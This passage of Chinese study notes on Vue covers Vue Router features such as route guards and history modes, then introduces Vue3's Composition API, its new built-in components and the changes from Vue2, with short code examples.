  //第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
  props(route){
    return {
      id:route.query.id,
      title:route.query.title
    }
  }
}
```

#### 8.`<router-link>`的replace属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为`push`和`replace`，`push`是追加历史记录，`replace`是替换当前记录。路由跳转时候默认为`push`
3. 如何开启`replace`模式：`<router-link replace .......>News</router-link>`

#### 9.编程式路由导航

1. 作用：不借助`<router-link> `实现路由跳转，让路由跳转更加灵活
2. 具体编码：

```JavaScript
//$router的两个API
this.$router.push({
  name:'xiangqing',
    params:{
      id:xxx,
      title:xxx
    }
})

this.$router.replace({
  name:'xiangqing',
    params:{
      id:xxx,
      title:xxx
    }
})
this.$router.forward() //前进
this.$router.back() //后退
this.$router.go() //可前进也可后退
```

#### 10.缓存路由组件

1. 作用：让不展示的路由组件保持挂载，不被销毁。
2. 具体编码：include后是要展示的组件的名字

```Vue
<keep-alive include="News"> //若不写include则，所有在这个router-view显示的组件都缓存
    <router-view></router-view>
</keep-alive>
```

#### 11.两个新的生命周期钩子

1. 作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
2. 具体名字：
    1. `activated`路由组件被激活时触发。
    2. `deactivated`路由组件失活时触发。

还有一个没在图中显示的是$nextTick

#### 12.路由守卫

1. 作用：对路由进行权限控制
2. 分类：全局守卫、独享守卫、组件内守卫
3. 全局守卫:

```JavaScript
//全局前置守卫：初始化时执行、每次路由切换前执行
router.beforeEach((to,from,next)=>{
  console.log('beforeEach',to,from)
  if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
    if(localStorage.getItem('school') === 'atguigu'){ //权限控制的具体规则
      next() //放行
    }else{
      alert('暂无权限查看')
      // next({name:'guanyu'})
    }
  }else{
    next() //放行
  }
})

//全局后置守卫：初始化时执行、每次路由切换后执行
router.afterEach((to,from)=>{
  console.log('afterEach',to,from)
  if(to.meta.title){ 
    document.title = to.meta.title //修改网页的title
  }else{
    document.title = 'vue_test'
  }
})
```
4. 独享守卫:

```JavaScript
beforeEnter(to,from,next){
  console.log('beforeEnter',to,from)
  if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
    if(localStorage.getItem('school') === 'atguigu'){
      next()
    }else{
      alert('暂无权限查看')
      // next({name:'guanyu'})
    }
  }else{
    next()
  }
}
```
5. 组件内守卫：

```JavaScript
//进入守卫：通过路由规则，进入该组件时被调用
beforeRouteEnter (to, from, next) {
},
//离开守卫：通过路由规则，离开该组件时被调用
beforeRouteLeave (to, from, next) {
}
```

全局路由和组件路由同时存在时，必须全局前置守卫→独享守卫→组件内进入守卫→全局的后置守卫；离开后执行，组件内离开守卫→全局前置→独享守卫→组件内进入守卫→全局后置守卫。

若再加上`activated`和`deactivated`那么此时的顺序为：前置路由守卫→独享路由守卫→组件进入守卫→全局后置守卫→activated组件被激活钩子函数

离开时会激活的顺序是：组件内离开守卫→前置路由守卫→独享路由守卫→组件进入守卫→全局后置守卫→

deactivated组件失活时触发的钩子函数→activated组件被激活时触发的钩子函数。



#### 13.路由器的两种工作模式

1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。
2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。
3. hash模式：
    1. 地址中永远带着#号，不美观 。
    2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
    3. 兼容性较好。
4. history模式：
    1. 地址干净，美观 。
    2. 兼容性和hash模式相比略差。
    3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。

### 为什么vue文件中只允许有一个根元素：

1）在自定义事件中，给子组件传值过程中不知道该给谁





# Vue3快速上手

## 1.Vue3简介

- 2020年9月18日，Vue.js发布3.0版本，代号：One Piece（海贼王）
- 耗时2年多、[2600+次提交](https://github.com/vuejs/vue-next/graphs/commit-activity)、[30+个RFC](https://github.com/vuejs/rfcs/tree/master/active-rfcs)、[600+次PR](https://github.com/vuejs/vue-next/pulls?q=is:pr+is:merged+-author:app/dependabot-preview+)、[99位贡献者](https://github.com/vuejs/vue-next/graphs/contributors) 
- github上的tags地址：[https://github.com/vuejs/vue-next/releases/tag/v3.0.0](https://github.com/vuejs/vue-next/releases/tag/v3.0.0)

## 2.Vue3带来了什么

### 1.性能的提升

- 打包大小减少41%
- 初次渲染快55%, 更新渲染快133%
- 内存减少54%

    ......

### 2.源码的升级

- 使用Proxy代替defineProperty实现响应式
- 重写虚拟DOM的实现和Tree-Shaking

    ......

### 3.拥抱TypeScript

- Vue3可以更好的支持TypeScript

### 4.新的特性

1. Composition API（组合API）
    - setup配置
    - ref与reactive
    - watch与watchEffect
    - provide与inject
    - ......
2. 新的内置组件
    - Fragment 
    - Teleport
    - Suspense
3. 其他改变
    - 新的生命周期钩子
    - data 选项应始终被声明为一个函数
    - 移除keyCode支持作为 v-on 的修饰符
    - ......

# 一、创建Vue3.0工程

## 1.使用 vue-cli 创建

官方文档：[https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create](https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create)

```Bash
## 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上
vue --version
## 安装或者升级你的@vue/cli
npm install -g @vue/cli
## 创建
vue create vue_test
## 启动
cd vue_test
npm run serve
```

## 2.使用 vite 创建

官方文档：[https://v3.cn.vuejs.org/guide/installation.html#vite](https://v3.cn.vuejs.org/guide/installation.html#vite)

vite官网：[https://vitejs.cn](https://vitejs.cn)

- 什么是vite？—— 新一代前端构建工具。
- 优势如下：
    - 开发环境中，无需打包操作，可快速的冷启动。
    - 轻量快速的热重载（HMR）。
    - 真正的按需编译，不再等待整个应用编译完成。
- 传统构建 与 vite构建对比图

<img src="[https://cn.vitejs.dev/assets/bundler.37740380.png](https://cn.vitejs.dev/assets/bundler.37740380.png)" style="width:500px;height:280px;float:left" /><img src="[https://cn.vitejs.dev/assets/esm.3070012d.png](https://cn.vitejs.dev/assets/esm.3070012d.png)" style="width:480px;height:280px" />

```Bash
## 创建工程
npm init vite-app <project-name>
## 进入工程目录
cd <project-name>
## 安装依赖
npm install
## 运行
npm run dev
```

# 二、常用 Composition API

官方文档: [https://v3.cn.vuejs.org/guide/composition-api-introduction.html](https://v3.cn.vuejs.org/guide/composition-api-introduction.html)

## 1.拉开序幕的setup

1. 理解：Vue3.0中一个新的配置项，值为一个函数。
2. setup是所有Composition API（组合API）“ 表演的舞台 ”。
3. 组件中所用到的：数据、方法、计算属性、监视属性、生命周期等等，均要配置在setup中。
4. setup函数的两种返回值：
    1. 若返回一个对象，则对象中的属性、方法, 在模板中均可以直接使用。（重点关注！）
    2. 若返回一个渲染函数：则可以自定义渲染内容。（了解）
5. 注意点：
    1. 尽量不要与Vue2.x配置混用
        - Vue2.x配置（data、methos、computed...）中可以访问到setup中的属性、方法。
        - 但在setup中不能访问到Vue2.x配置（data、methos、computed...）。
        - 如果有重名, setup优先。
    2. setup不能是一个async函数，因为返回值不再是return的对象, 而是promise, 模板看不到return对象中的属性。（后期也可以返回一个Promise实例，但需要Suspense和异步组件的配合）

## 2.ref函数

- 作用: 定义一个响应式的数据
- 语法: `const xxx = ref(initValue)` 
    - 创建一个包含响应式数据的引用对象（reference对象，简称ref对象）。
    - JS中操作数据： `xxx.value`
    - 模板中读取数据: 不需要.value，直接：`<div>{{xxx}}</div>`
- 备注：
    - 接收的数据可以是：基本类型、也可以是对象类型。
    - 基本类型的数据：响应式依然是靠`Object.defineProperty()`的`get`与`set`完成的。
    - 对象类型的数据：内部“ 求助 ” 了Vue3.0中的一个新函数—— `reactive`函数。
    - 获取对象属性时`obj.value.xxx`属性后不需要加value

## 3.reactive函数

- 作用: 定义一个对象类型的响应式数据（基本类型不要用它，要用`ref`函数）
- 语法：`const 代理对象= reactive(源对象)`接收一个对象（或数组），返回一个代理对象（Proxy的实例对象，简称proxy对象）
- reactive定义的响应式数据是“深层次的”。
- 内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据进行操作。

## 4.Vue3.0中的响应式原理

### vue2.x的响应式

- 实现原理：
    - 对象类型：通过`Object.defineProperty()`对属性的读取、修改进行拦截（数据劫持）。
    - 数组类型：通过重写更新数组的一系列方法来实现拦截。（对数组的变更方法进行了包裹）。

```JavaScript
Object.defineProperty(data, 'count', {
    get () {}, 
    set () {}
})
```
- 存在问题：
    - 新增属性、删除属性, 界面不会更新。
    - 直接通过下标修改数组, 界面不会自动更新。

### Vue3.0的响应式

- 实现原理: 
    - 通过Proxy（代理）:  拦截对象中任意属性的变化, 包括：属性值的读写、属性的添加、属性的删除等。
    - 通过Reflect（反射）:  对源对象的属性进行操作。
    - MDN文档中描述的Proxy与Reflect：
        - Proxy：[https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy)
        - Reflect：[https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect)

```JavaScript
new Proxy(data, {
  // 拦截读取属性值
    get (target, prop) {
      return Reflect.get(target, prop)
    },
    // 拦截设置属性值或添加新属性
    set (target, prop, value) {
      return Reflect.set(target, prop, value)
    },
    // 拦截删除属性
    deleteProperty (target, prop) {
      return Reflect.deleteProperty(target, prop)
    }
})

proxy.name = 'tom'   
```

## 5.reactive对比ref

- 从定义数据角度对比：
    - ref用来定义：基本类型数据。
    - reactive用来定义：对象（或数组）类型数据。
    - 备注：ref也可以用来定义对象（或数组）类型数据, 它内部会自动通过`reactive`转为代理对象。
- 从原理角度对比：
    - ref通过`Object.defineProperty()`的`get`与`set`来实现响应式（数据劫持）。
    - reactive通过使用Proxy来实现响应式（数据劫持）, 并通过操作源对象内部的数据。
- 从使用角度对比：
    - ref定义的数据：操作数据需要`.value`，读取数据时模板中直接读取不需要`.value`。
    - reactive定义的数据：操作数据与读取数据：均不需要`.value`。

## 6.setup的两个注意点

- setup执行的时机
    - 在beforeCreate之前执行一次，this是undefined。
- setup的参数
    - props：值为对象，包含：组件外部传递过来，且组件内部声明接收了的属性。
    - context：上下文对象
        - attrs: 值为对象，包含：组件外部传递过来，但没有在props配置中声明的属性, 相当于 `this.$attrs`。
        - slots: 收到的插槽内容, 相当于 `this.$slots`。
        - emit: 分发自定义事件的函数, 相当于 `this.$emit`。

## 7.计算属性与监视

### 1.computed函数

- 与Vue2.x中computed配置功能一致
- 写法

```JavaScript
import {computed} from 'vue'

setup(){
    ...
  //计算属性——简写
    let fullName = computed(()=>{
        return person.firstName + '-' + person.lastName
    })
    //计算属性——完整
    let fullName = computed({
        get(){
            return person.firstName + '-' + person.lastName
        },
        set(value){
            const nameArr = value.split('-')
            person.firstName = nameArr[0]
            person.lastName = nameArr[1]
        }
    })
}
```

### 2.watch函数

- 与Vue2.x中watch配置功能一致
- 两个小“坑”：
    - 监视reactive定义的响应式数据时：oldValue无法正确获取、强制开启了深度监视（deep配置失效）。
    - 监视reactive定义的响应式数据中某个属性时：deep配置有效。
    - ref定义的基本数据类型，在监视的时候不加.value，ref定义的引用类型数据需要加.value或者加deep:true才能监视到引用类型数据中的属性。

```JavaScript
//情况一：监视ref定义的响应式数据
watch(sum,(newValue,oldValue)=>{
  console.log('sum变化了',newValue,oldValue)
},{immediate:true})

//情况二：监视多个ref定义的响应式数据
watch([sum,msg],(newValue,oldValue)=>{
  console.log('sum或msg变化了',newValue,oldValue)
}) 

/* 情况三：监视reactive定义的响应式数据
      若watch监视的是reactive定义的响应式数据，则无法正确获得oldValue！！
      若watch监视的是reactive定义的响应式数据，则强制开启了深度监视 
*/
watch(person,(newValue,oldValue)=>{
  console.log('person变化了',newValue,oldValue)
},{immediate:true,deep:false}) //此处的deep配置不再奏效

//情况四：监视reactive定义的响应式数据中的某个属性
watch(()=>person.job,(newValue,oldValue)=>{
  console.log('person的job变化了',newValue,oldValue)
},{immediate:true,deep:true}) 

//情况五：监视reactive定义的响应式数据中的某些属性
watch([()=>person.job,()=>person.name],(newValue,oldValue)=>{
  console.log('person的job变化了',newValue,oldValue)
},{immediate:true,deep:true})

//特殊情况
watch(()=>person.job,(newValue,oldValue)=>{
    console.log('person的job变化了',newValue,oldValue)
},{deep:true}) //此处由于监视的是reactive所定义的对象中的某个属性，所以deep配置有效
```

### 3.watchEffect函数

- watch的套路是：既要指明监视的属性，也要指明监视的回调。
- watchEffect的套路是：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性。
- watchEffect有点像computed：
    - 但computed注重的计算出来的值（回调函数的返回值），所以必须要写返回值。
    - 而watchEffect更注重的是过程（回调函数的函数体），所以不用写返回值。

```JavaScript
//watchEffect所指定的回调中用到的数据只要发生变化，则直接重新执行回调。
watchEffect(()=>{
    const x1 = sum.value
    const x2 = person.age
    console.log('watchEffect配置的回调执行了')
})
```

## 8.生命周期

- Vue3.0中可以继续使用Vue2.x中的生命周期钩子，但有有两个被更名：
    - `beforeDestroy`改名为 `beforeUnmount`
    - `destroyed`改名为 `unmounted`
- Vue3.0也提供了 Composition API 形式的生命周期钩子，与Vue2.x中钩子对应关系如下：
    - `beforeCreate`===>`setup()`
    - `created`=======>`setup()`
    - `beforeMount` ===>`onBeforeMount`
    - `mounted`=======>`onMounted`
    - `beforeUpdate`===>`onBeforeUpdate`
    - `updated` =======>`onUpdated`
    - `beforeUnmount` ==>`onBeforeUnmount`
    - `unmounted` =====>`onUnmounted`

## 9.自定义hook函数

- 什么是hook？—— 本质是一个函数，把setup函数中使用的Composition API进行了封装。
- 类似于vue2.x中的mixin。
- 自定义hook的优势: 复用代码, 让setup中的逻辑更清楚易懂。

## 10.toRef

- 作用：创建一个 ref 对象，其value值指向另一个对象中的某个属性。
- 语法：`const name = toRef(person,'name')`
- 应用:   要将响应式对象中的某个属性单独提供给外部使用时。
- 扩展：`toRefs` 与`toRef`功能一致，但可以批量创建多个 ref 对象，语法：`toRefs(person)`

# 三、其它 Composition API

## 1.shallowReactive 与 shallowRef

- shallowReactive：只处理对象最外层属性的响应式（浅响应式）。
- shallowRef：只处理基本数据类型的响应式, 不进行对象的响应式处理。
- 什么时候使用?
    - 如果有一个对象数据，结构比较深, 但变化时只是外层属性变化 ===> shallowReactive。
    - 如果有一个对象数据，后续功能不会修改该对象中的属性，而是生新的对象来替换 ===> shallowRef。

## 2.readonly 与 shallowReadonly

- readonly: 让一个响应式数据变为只读的（深只读）。
- shallowReadonly：让一个响应式数据变为只读的（浅只读）。
- 应用场景: 不希望数据被修改时。

## 3.toRaw 与 markRaw

- toRaw：
    - 作用：将一个由`reactive`生成的响应式对象转为普通对象。
    - 使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新。
- markRaw：
    - 作用：标记一个对象，使其永远不会再成为响应式对象。
    - 应用场景:
        1. 有些值不应被设置为响应式的，例如复杂的第三方类库等。
        2. 当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能。

## 4.customRef

- 作用：创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制。
- 实现防抖效果：

```Vue
<template>
  <input type="text" v-model="keyword">
  <h3>{{keyword}}</h3>
</template>

<script>
  import {ref,customRef} from 'vue'
  export default {
    name:'Demo',
    setup(){
      // let keyword = ref('hello') //使用Vue准备好的内置ref
      //自定义一个myRef
      function myRef(value,delay){
        let timer
        //通过customRef去实现自定义
        return customRef((track,trigger)=>{
          return{
            get(){
              track() //告诉Vue这个value值是需要被“追踪”的
              return value
            },
            set(newValue){
              clearTimeout(timer)
              timer = setTimeout(()=>{
                value = newValue
                trigger() //告诉Vue去更新界面
              },delay)
            }
          }
        })
      }
      let keyword = myRef('hello',500) //使用程序员自定义的ref
      return {
        keyword
      }
    }
  }
</script>
```

## 5.provide 与 inject

- 作用：实现祖与后代组件间通信
- 套路：父组件有一个 `provide` 选项来提供数据，后代组件有一个 `inject` 选项来开始使用这些数据
- 具体写法：
    1. 祖组件中：

        

```JavaScript
setup(){
  ......
    let car = reactive({name:'奔驰',price:'40万'})
    provide('car',car)
    ......
}
```
    2. 后代组件中：

```JavaScript
setup(props,context){
  ......
    const car = inject('car')
    return {car}
  ......
}
```

## 6.响应式数据的判断

- isRef: 检查一个值是否为一个 ref 对象
- isReactive: 检查一个对象是否是由 `reactive` 创建的响应式代理
- isReadonly: 检查一个对象是否是由 `readonly` 创建的只读代理
- isProxy: 检查一个对象是否是由 `reactive` 或者 `readonly` 方法创建的代理

# 四、Composition API 的优势

## 1.Options API 存在的问题

使用传统OptionsAPI中，新增或者修改一个需求，就需要分别在data，methods，computed里修改 。

## 2.Composition API 的优势

我们可以更加优雅的组织我们的代码，函数。让相关功能的代码更加有序的组织在一起。

# 五、新的组件

## 1.Fragment

- 在Vue2中: 组件必须有一个根标签
- 在Vue3中: 组件可以没有根标签, 内部会将多个标签包含在一个Fragment虚拟元素中
- 好处: 减少标签层级, 减小内存占用

## 2.Teleport

- 什么是Teleport？—— `Teleport` 是一种能够将我们的组件html结构移动到指定位置的技术。

```Vue
<teleport to="移动位置">
  <div v-if="isShow" class="mask">
    <div class="dialog">
      <h3>我是一个弹窗</h3>
      <button @click="isShow = false">关闭弹窗</button>
    </div>
  </div>
</teleport>
```

## 3.Suspense

- 等待异步组件时渲染一些额外内容，让应用有更好的用户体验
- 使用步骤：
    - 异步引入组件

```JavaScript
import {defineAsyncComponent} from 'vue'
const Child = defineAsyncComponent(()=>import('./components/Child.vue'))
```
    - 使用`Suspense`包裹组件，并配置好`default` 与 `fallback`

```Vue
<template>
  <div class="app">
    <h3>我是App组件</h3>
    <Suspense>
      <template v-slot:default>
        <Child/>
      </template>
      <template v-slot:fallback>
        <h3>加载中.....</h3>
      </template>
    </Suspense>
  </div>
</template>
```

# 六、其他

## 1.全局API的转移

- Vue 2.x 有许多全局 API 和配置。
    - 例如：注册全局组件、注册全局指令等。

```JavaScript
//注册全局组件
Vue.component('MyButton', {
  data: () => ({
    count: 0
  }),
  template: '<button @click="count++">Clicked {{ count }} times.</button>'
})

//注册全局指令
Vue.directive('focus', {
  inserted: el => el.focus()
}
```
- Vue3.0中对这些API做出了调整：
    - 将全局的API，即：`Vue.xxx`调整到应用实例（`app`）上

        ![](https://secure2.wostatic.cn/static/qWCCVcdamZpqdUKkpXdf6H/image.png?auth_key=1694396754-tQiT3tnmAxZwKKXAuJK5xD-0-c31b2154443226d475530cd57d774c86)

## 2.其他改变

- data选项应始终被声明为一个函数。
- 过度类名的更改：
    - Vue2.x写法

```CSS
.v-enter,
.v-leave-to {
  opacity: 0;
}
.v-leave,
.v-enter-to {
  opacity: 1;
}
```
    - Vue3.x写法

```CSS
.v-enter-from,
.v-leave-to {
  opacity: 0;
}

.v-leave-from,
.v-enter-to {
  opacity: 1;
}
```
- 移除keyCode作为 v-on 的修饰符，同时也不再支持`config.keyCodes`
- 移除`v-on.native`修饰符
    - 父组件中绑定事件

```Vue
<my-component
  v-on:close="handleComponentEvent"
  v-on:click="handleNativeClickEvent"
/>
```
    - 子组件中声明自定义事件

```Vue
<script>
  export default {
    emits: ['close']
  }
</script>
```
- <strong style="color:#DD5145">移除</strong>过滤器（filter）

    > 过滤器虽然这看起来很方便，但它需要一个自定义语法，打破大括号内表达式是 “只是 JavaScript” 的假设，这不仅有学习成本，而且有实现成本！建议用方法调用或计算属性去替换过滤器。
- ......
